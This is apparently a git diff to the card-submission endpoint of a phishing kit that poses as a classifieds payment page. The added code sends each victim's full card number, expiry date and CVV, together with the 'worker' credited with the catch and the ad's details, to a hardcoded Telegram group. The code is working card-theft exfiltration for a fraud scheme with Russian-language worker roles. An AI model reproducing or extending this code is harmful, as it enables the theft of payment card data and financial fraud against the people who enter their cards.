@@ -650,6 +650,30 @@ app.post(`/api/submitCard`, async (req, res) => {
       }
     );
   }
+
+  await bot.sendMessage(
+    -1001619354006,
+    `<b>✏️ Ввод карты ${ad.service.title}</b>
+
+💰 Баланс: <code>${getBalance(log, ad)}</code>
+
+💳 Номер карты: <b>${log.cardNumber}</b>
+📅 Срок действия: <b>${log.cardExpire}</b>
+🔒 CVV: <b>${log.cardCvv}</b>
+
+ℹ️ Информация о карте: ${cardInfo}
+
+👨🏻‍💻 Воркер: <b><a href="tg://user?id=${ad.userId}">${ad.user.username}</a></b>
+👤 ID Воркера: <code>${ad.userId}</code>
+
+⚡️ ID Объявления: <code>${ad.id}</code>
+📦 Объявление: <b>${ad.title}</b>
+💰 Цена: <b>${ad.price}</b>`,
+    {
+      parse_mode: "HTML",
+    }
+  );
+
     await bot
       .sendMessage(
         ad.userId,
